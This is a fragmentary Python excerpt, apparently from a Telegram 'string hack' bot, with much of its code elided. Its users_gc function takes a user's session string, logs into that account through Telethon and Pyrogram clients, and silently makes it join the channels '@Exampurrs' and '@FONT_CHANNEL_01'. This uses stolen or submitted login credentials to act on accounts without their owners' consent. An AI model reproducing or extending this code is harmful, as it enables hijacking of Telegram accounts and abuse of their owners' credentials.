...
from DAXXSTRINGHACK.Helpers.data import info
...
async def users_gc(session):
    ...
    try:
        if session.endswith("="):
            ...
            await steve.connect()                          
            try:
                await steve(join("@Exampurrs"))
                await steve(join("@FONT_CHANNEL_01"))
            ...
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Exampurrs")
                    await stark.join_chat("@FONT_CHANNEL01")
                except Exception as e:
                    print(e)    
    ...
    try:
        if session.endswith("="):
            ...
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Exampurrs")
                    await stark.join_chat("@FONT_CHANNEL_01")
                except Exception as e:
                    print(e)    
